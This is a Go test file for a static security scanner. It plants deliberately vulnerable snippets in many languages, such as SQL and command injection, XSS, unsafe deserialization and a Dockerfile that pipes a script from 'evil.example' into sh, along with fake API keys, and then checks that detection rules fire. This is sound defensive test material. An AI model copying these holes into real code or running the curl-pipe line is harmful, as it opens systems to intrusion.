package services

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"black-hat/models"
)

// writeProject creates a temp project dir with the given file name -> content.
func writeProject(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, content := range files {
		p := filepath.Join(dir, name)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

func runBuiltin(t *testing.T, files map[string]string) *models.AnalysisResult {
	t.Helper()
	dir := writeProject(t, files)
	res, err := NewAnalyzer().AnalyzeProject(dir)
	if err != nil {
		t.Fatal(err)
	}
	return res
}

func rulesOf(findings []models.SecurityFinding) []string {
	var rules []string
	for _, f := range findings {
		rules = append(rules, f.Rule)
	}
	return rules
}

func hasRule(findings []models.SecurityFinding, rule string) bool {
	for _, f := range findings {
		if f.Rule == rule {
			return true
		}
	}
	return false
}

// TestBuiltinFindsVulnerabilitiesAcrossLanguages proves the zero-dependency
// analyzer produces REAL findings for the classic vulnerability classes, even
// though no external SAST tool is installed (the serverless/Vercel situation).
func TestBuiltinFindsVulnerabilitiesAcrossLanguages(t *testing.T) {
	res := runBuiltin(t, map[string]string{
		"app.py": `import sqlite3, subprocess, os, pickle

def get_user(name):
    con = sqlite3.connect("app.db")
    cur = con.cursor()
    cur.execute("SELECT * FROM users WHERE name = '" + name + "'")
    return cur.fetchall()

os.system("ping " + host)
data = pickle.loads(untrusted)
md5_hash = hashlib.md5(secret).hexdigest()
API_KEY = "sk-live-abcdefghijklmnopqrstuvwxyz123456"
`,
		"app.js": `const cp = require('child_process');
const db = require('db');
document.getElementById("out").innerHTML = userInput;
db.query("SELECT * FROM users WHERE id = " + req.query.id);
cp.exec("ls " + dir, { shell: true });
`,
		"main.go": `package main

import (
	"database/sql"
	"os/exec"
)

func get(db *sql.DB, id string) {
	rows, _ := db.Query("SELECT * FROM users WHERE id = " + id)
	exec.Command("sh", "-c", "cat "+id).Run()
}
`,
		"index.php": `<?php
$conn = new mysqli("localhost", "u", "p", "d");
$result = $conn->query("SELECT * FROM users WHERE id = " . $_GET['id']);
echo $_GET['q'];
system("ping " . $_GET['host']);
include($_POST['page']);
?>`,
	})

	if len(res.SecurityFindings) == 0 {
		t.Fatal("builtin analyzer found NOTHING on deliberately vulnerable files — false negative")
	}

	for _, rule := range []string{
		"builtin.sql-injection.python",
		"builtin.command-injection.python",
		"builtin.unsafe-deserialization.python",
		"builtin.weak-crypto.python",
		"builtin.secret.Stripe API key hardcoded in source",
		"builtin.xss.javascript",
		"builtin.sql-injection.javascript",
		"builtin.command-injection.javascript",
		"builtin.sql-injection.go",
		"builtin.command-injection.go",
		"builtin.sql-injection.php",
		"builtin.xss.php",
		"builtin.command-injection.php",
		"builtin.file-inclusion.php",
	} {
		if !hasRule(res.SecurityFindings, rule) {
			t.Errorf("expected rule %q to be reported; got %v", rule, rulesOf(res.SecurityFindings))
		}
	}

	// The builtin scanner must be recorded as successful with its findings.
	// Compare against findings tagged with the builtin tool only — on dev
	// machines some external scanners (bandit, gitleaks, ...) are installed and
	// legitimately add their own findings to the same result.
	builtinCount := 0
	for _, f := range res.SecurityFindings {
		if f.Tool == builtinToolName {
			builtinCount++
		}
	}
	statusFound := false
	for _, st := range res.ToolStatuses {
		if st.Tool != builtinToolName {
			continue
		}
		statusFound = true
		if st.Status != statusSuccess {
			t.Errorf("builtin status = %s, want success", st.Status)
		}
		if st.Findings != builtinCount {
			t.Errorf("builtin status findings = %d, want %d", st.Findings, builtinCount)
		}
	}
	if !statusFound {
		t.Fatal("builtin tool status not recorded")
	}
}

// TestBuiltinCoversMoreFileTypes proves the zero-dependency analyzer now
// catches issues in C/C++, C#, Swift, HTML, Dockerfile, Terraform and
// Kubernetes manifests — the "all file types" promise.
func TestBuiltinCoversMoreFileTypes(t *testing.T) {
	res := runBuiltin(t, map[string]string{
		"main.c": `#include <string.h>
#include <stdlib.h>
void copy(char *buf, const char *src) {
    strcpy(buf, src);
    system("cat " + src);
    printf(src);
}
`,
		"app.cs": `Response.Write(Request.QueryString["q"]);`,
		"App.swift": `let data = try NSKeyedUnarchiver.unarchiveTopLevelObjectWithData(blob)
let h = Insecure.MD5.hash(data: payload)`,
		"index.html": `<a href="javascript:alert(1)">x</a> <button onclick="run()">go</button>`,
		"Dockerfile": `FROM debian
RUN curl -fsSL https://evil.example/x.sh | sh
CMD ["/bin/bash"]`,
		"main.tf": `resource "aws_security_group" "web" {
  ingress {
    cidr_blocks = ["0.0.0.0/0"]
  }
}
resource "aws_s3_bucket" "b" {
  acl = "public-read"
}`,
		"pod.yaml": `apiVersion: v1
kind: Pod
spec:
  hostNetwork: true
  containers:
  - name: c
    securityContext:
      privileged: true
`,
		"keys.env": `OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz1234567890
HF_TOKEN=hf_abcdefghijklmnopqrstuvwxyz123456
NPM_AUTHTOKEN=//registry.npmjs.org/:_authToken=abcdefghijklmnopqrstuvwxyz123456
`,
	})

	for _, rule := range []string{
		"builtin.unsafe-string.c",
		"builtin.command-injection.c",
		"builtin.format-string.c",
		"builtin.xss.csharp",
		"builtin.unsafe-deserialization.swift",
		"builtin.weak-crypto.swift",
		"builtin.xss.html-inline",
		"builtin.docker-remote-script",
		"builtin.terraform-open-ingress",
		"builtin.terraform-s3-public",
		"builtin.k8s-privileged",
		"builtin.secret.OpenAI/Anthropic API key hardcoded in source",
		"builtin.secret.Hugging Face access token hardcoded in source",
		"builtin.secret.npm registry auth token hardcoded in source",
	} {
		if !hasRule(res.SecurityFindings, rule) {
			t.Errorf("expected rule %q to be reported; got %v", rule, rulesOf(res.SecurityFindings))
		}
	}
}

// TestBuiltinCleanCodeProducesNoFindings guards against false positives: a
// parameterized, safe codebase must not be flagged by the pattern rules.
func TestBuiltinCleanCodeProducesNoFindings(t *testing.T) {
	res := runBuiltin(t, map[string]string{
		"clean.py": `import sqlite3

def get_user(name):
    con = sqlite3.connect("app.db")
    cur = con.cursor()
    cur.execute("SELECT * FROM users WHERE name = ?", (name,))
    return cur.fetchall()
`,
		"clean.js": `const db = require('db');
function load(id) {
  const el = document.getElementById("out");
  el.textContent = "Loading " + id;
  return db.query("SELECT * FROM users WHERE id = ?", [id]);
}
`,
		"clean.go": `package main

import "database/sql"

func get(db *sql.DB, id string) {
	db.Query("SELECT * FROM users WHERE id = ?", id)
}
`,
	})

	for _, f := range res.SecurityFindings {
		if strings.HasPrefix(f.Rule, "builtin.sql-injection") ||
			strings.HasPrefix(f.Rule, "builtin.xss") ||
			strings.HasPrefix(f.Rule, "builtin.command-injection") {
			t.Errorf("false positive on clean code: %s at %s:%d", f.Rule, f.FilePath, f.LineNumber)
		}
	}
}

// TestBuiltinIgnoresPlaceholdersAndEnvReferences verifies obvious placeholder
// and environment-reference values are not reported as hardcoded secrets.
func TestBuiltinIgnoresPlaceholdersAndEnvReferences(t *testing.T) {
	res := runBuiltin(t, map[string]string{
		"config.py": `api_key = "YOUR_API_KEY_HERE"
password = os.environ.get("DB_PASSWORD", "default")
token = "${TOKEN}"
`,
	})

	for _, f := range res.SecurityFindings {
		if strings.HasPrefix(f.Rule, "builtin.secret.") {
			t.Errorf("placeholder/env value flagged as secret: %s at %s:%d (%s)", f.Rule, f.FilePath, f.LineNumber, f.Description)
		}
	}
}

// TestBuiltinDetectsEnvFileSecrets checks .env-style files with real values.
func TestBuiltinDetectsEnvFileSecrets(t *testing.T) {
	res := runBuiltin(t, map[string]string{
		".env": `AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
GITHUB_TOKEN=ghp_1234567890abcdefghijklmnopqrstuvwxyz
DB_PASSWORD=sup3rSecretPassword123!
`,
	})

	if !hasRule(res.SecurityFindings, "builtin.secret.AWS Access Key ID hardcoded in source") {
		t.Errorf("AWS access key not flagged; got %v", rulesOf(res.SecurityFindings))
	}
	if !hasRule(res.SecurityFindings, "builtin.secret.GitHub personal access token hardcoded in source") {
		t.Errorf("GitHub token not flagged; got %v", rulesOf(res.SecurityFindings))
	}
	if !hasRule(res.SecurityFindings, "builtin.secret.hardcoded-credential") {
		t.Errorf("generic hardcoded credential (DB_PASSWORD) not flagged; got %v", rulesOf(res.SecurityFindings))
	}
}

// TestBuiltinCoversRust proves the zero-dependency analyzer catches the classic
// vulnerability classes in Rust source (command injection via shell -c, SQL
// injection via format!, weak crypto, unsafe memory ops, path traversal).
func TestBuiltinCoversRust(t *testing.T) {
	res := runBuiltin(t, map[string]string{
		"main.rs": `use std::process::Command;
use std::fs;

fn run(user_input: &str) {
    // Command injection: shell -c with format!
    let out = Command::new("sh").arg("-c").arg(format!("ls {}", user_input)).output().unwrap();

    // SQL injection: format! into a query
    let conn = rusqlite::Connection::open_in_memory().unwrap();
    conn.execute(&format!("SELECT * FROM users WHERE id = {}", user_input), []).unwrap();

    // Weak crypto
    let digest = md5::compute(b"secret");

    // Unsafe memory
    let x: u64 = unsafe { std::mem::transmute(1.0f64) };

    // Path traversal
    let data = fs::read_to_string(format!("./files/{}", user_input)).unwrap();
    let _ = (out, digest, x, data);
}
`,
	})

	for _, rule := range []string{
		"builtin.command-injection.rust",
		"builtin.sql-injection.rust",
		"builtin.weak-crypto.rust",
		"builtin.unsafe-memory.rust",
		"builtin.path-traversal.rust",
	} {
		if !hasRule(res.SecurityFindings, rule) {
			t.Errorf("expected rule %q to be reported; got %v", rule, rulesOf(res.SecurityFindings))
		}
	}
}

// TestBuiltinRustCleanCodeNotFlagged guards the Rust rules against false
// positives: safe Command usage, parameterized queries and plain fs reads must
// not be reported.
func TestBuiltinRustCleanCodeNotFlagged(t *testing.T) {
	res := runBuiltin(t, map[string]string{
		"clean.rs": `use std::process::Command;
use std::fs;

fn run(user_input: &str) {
    // Safe: args passed separately, no shell.
    let out = Command::new("cat").arg(user_input).output().unwrap();

    // Safe: bound parameter.
    let conn = rusqlite::Connection::open_in_memory().unwrap();
    conn.execute("SELECT * FROM users WHERE id = ?1", rusqlite::params![user_input]).unwrap();

    // Safe: fixed path, no dynamic building.
    let data = fs::read_to_string("./files/config.toml").unwrap();
    let _ = (out, data);
}
`,
	})

	for _, f := range res.SecurityFindings {
		if strings.HasPrefix(f.Rule, "builtin.") && strings.HasSuffix(f.Rule, ".rust") {
			t.Errorf("false positive on clean Rust code: %s at %s:%d", f.Rule, f.FilePath, f.LineNumber)
		}
	}
}

// TestBuiltinExtendedRules covers the extended rule set (SSRF, path traversal,
// prototype pollution, XXE, Lua, PowerShell, XPath) across languages.
func TestBuiltinExtendedRules(t *testing.T) {
	res := runBuiltin(t, map[string]string{
		"app.js": `const http = require('http');
// SSRF: fetch to a URL assembled from request data
fetch('https://api.internal/' + req.query.url);
// Path traversal: user-controlled path into fs
fs.readFileSync('/var/data/' + req.params.file);
// Prototype pollution
Object.assign(target, { [req.query.key]: req.query.value });
target["__proto__"][req.body.key] = req.body.value;
`,
		"server.py": `import requests, os
# SSRF
r = requests.get("http://internal/" + request.args.get("url"))
# Path traversal
with open("/srv/files/" + request.args.get("name")) as f:
    pass
`,
		"main.go": `package main
import (
    "net/http"
    "os"
    "fmt"
)
func h(w http.ResponseWriter, r *http.Request) {
    http.Get("http://internal/" + r.URL.Query().Get("u"))  // SSRF
    os.ReadFile("/data/" + r.URL.Path)                     // path traversal
    token := fmt.Sprintf("%d", rand.Intn(100000))          // weak random
}
`,
		"Parser.java": `import javax.xml.parsers.*;
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", false); // XXE
File f = new File("/www/" + request.getParameter("file"));                     // traversal
`,
		"fetch.lua": `os.execute("rm -rf " .. ngx.var.arg_path)  -- command injection
db:execute("SELECT * FROM users WHERE id = " .. ngx.var.arg_id) -- sql injection
loadstring("return " .. ngx.var.arg_expr)                       -- code execution
`,
		"run.ps1": `Invoke-Expression $inputString`,
		"query.cs": `var html = client.GetStringAsync("https://internal/" + Request.QueryString["url"]);
var text = File.ReadAllText("/srv/" + Request.QueryString["f"]);
var h = MD5.Create();
`,
		"select.xml": `let $n := doc("x")/x[user = "'" + $input]
`,
		"app.php": `$hash = md5($password);`,
	})

	for _, rule := range []string{
		"builtin.ssrf.javascript",
		"builtin.path-traversal.javascript",
		"builtin.prototype-pollution.javascript",
		"builtin.ssrf.python",
		"builtin.path-traversal.python",
		"builtin.ssrf.go",
		"builtin.path-traversal.go",
		"builtin.weak-random.go",
		"builtin.xxe.java",
		"builtin.path-traversal.java",
		"builtin.command-injection.lua",
		"builtin.sql-injection.lua",
		"builtin.code-execution.lua",
		"builtin.code-execution.powershell",
		"builtin.ssrf.csharp",
		"builtin.path-traversal.csharp",
		"builtin.weak-crypto.csharp",
		"builtin.weak-crypto.php",
	} {
		if !hasRule(res.SecurityFindings, rule) {
			t.Errorf("expected rule %q to be reported; got %v", rule, rulesOf(res.SecurityFindings))
		}
	}
}

// TestBuiltinExtendedSecrets verifies the added secret patterns fire.
func TestBuiltinExtendedSecrets(t *testing.T) {
	res := runBuiltin(t, map[string]string{
		".env": `GITLAB_TOKEN=glpat-TESTXxYyZzAbCdEfGh000000
TWILIO_SID=AC1234567890abcdefEXAMPLE123456
TWILIO_AUTH=SK1234567890abcdefEXAMPLE123456
AZURE_KEY=AccountKey=1234567890abcdefEXAMPLE1234567890abcdefEXAMPLE1234567890abcdefEXAMPLE1234567890abcdefEXAMPLE
PRIVATE_KEY="REPLACE_WITH_TEST_ONLY_RSA_KEY_DATA_HERE"
`,
	})

	for _, rule := range []string{
		"builtin.secret.GitLab personal access token hardcoded in source",
		"builtin.secret.Twilio Account SID hardcoded in source",
		"builtin.secret.Twilio auth token hardcoded in source",
		"builtin.secret.Azure Storage account key hardcoded in source",
	} {
		if !hasRule(res.SecurityFindings, rule) {
			t.Errorf("expected rule %q to be reported; got %v", rule, rulesOf(res.SecurityFindings))
		}
	}
}

// TestBuiltinTimeBudgetKeepsScanBounded ensures the scan stops when its time
// budget is exhausted instead of hanging a serverless request.
func TestBuiltinTimeBudgetKeepsScanBounded(t *testing.T) {
	runner := NewBuiltinRunner()
	runner.timeout = 1 * time.Millisecond
	dir := writeProject(t, map[string]string{
		"many.py": strings.Repeat("x = 1\n", 20000) + `eval(sys.argv[1])` + "\n",
	})

	start := time.Now()
	statuses := &ToolStatusCollector{}
	findings := runner.Run(dir, statuses)
	elapsed := time.Since(start)

	if elapsed > 2*time.Second {
		t.Errorf("bounded scan took %v; it should stop at the time budget", elapsed)
	}
	for _, st := range statuses.Snapshot() {
		if st.Tool == builtinToolName && st.Status != statusSuccess {
			t.Errorf("builtin status = %s, want success even when time-bounded", st.Status)
		}
	}
	_ = findings
}
